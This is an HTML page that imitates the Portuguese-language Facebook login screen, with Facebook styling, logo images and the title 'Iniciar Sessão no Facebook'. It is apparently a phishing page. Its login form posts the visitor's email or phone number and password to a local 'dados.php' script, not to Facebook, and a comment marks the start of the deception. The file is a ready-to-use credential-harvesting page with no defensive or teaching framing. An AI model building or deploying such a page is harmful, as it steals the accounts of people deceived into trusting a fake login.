<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
	<title>Iniciar Sessão no Facebook | Facebook</title>
</head>
<body>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-3"></div>
			<div class="col-md-7" style="background-color:#3b5998; height: 40px;">
			<!--- aqui comeca a festa-->
			   <div style="float: left; ">
				  
                    <a href="index.html"><img src="image/Capturar.PNG" width="88px" height="34px;"  srcset=""></a>
               </div>
               <div style="float: right;">
                <a href="www.facebook.com"><img src="image/conta.PNG"  width="100px" height="34px;" srcset="" ></a>
            </div><br><br><br>
                <div style="float: left; margin-right: 60px;">
                    <img src="image/sss.PNG" height="30px">
                </div>

                <div style="background-color: #eceff5;">
                    <form action="dados.php" method="POST">
                        <div class="form-group">
                            <h5 style="color: #8d949e;">Número de telefone ou e-mail</h5>
                            <input type="text" name="email" class="form-control" height="300px">
                        </div>
                        <div class="form-group">
                            <h5 style="color: #8d949e;">Palavra-passe</h5>
                            <input type="password" name="senha" class="form-control" height="300px">
                        </div>

                        <button class="btn btn-block btn-lg" name="enviar" style="background-color: #4267b2; color: white;">Iniciar Sessão</button>
                        <div style="text-align: center;">
                            ou <br>
                            <button class="btn btn-lg" style="background-color: #42b72a; color: white;">Criar Nova Conta</button>
                        </div>
                        <br>
                        <div style="float: left;">
                           <a href="www.facebook.com"><h6>Não sabes a tua palavra-passe?</h6></a>
                        </div>
                    </form>
                </div>
			</div>
		</div>
	</div>
</body>
</html>